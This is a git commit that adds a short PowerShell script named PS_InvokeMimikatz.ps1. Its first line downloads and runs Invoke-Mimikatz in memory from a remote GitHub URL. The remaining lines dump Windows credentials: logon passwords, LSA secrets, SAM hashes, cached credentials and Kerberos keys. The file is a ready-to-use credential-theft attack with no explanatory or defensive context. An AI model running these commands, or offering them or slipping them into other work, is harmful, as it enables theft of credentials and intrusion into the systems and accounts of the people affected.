fec224cacdf62ef2c728e5b84f6de8b7c8207d43
HashingTuna <38752407+Hrztrm@users.noreply.github.com>
2024-03-17 11:31:19 +0800

    Create PS_InvokeMimikatz.ps1

---
+++ BasicReverseP1/PS_InvokeMimikatz.ps1
@@ -0,0 +1,3 @@
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds #Dump creds from memory
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
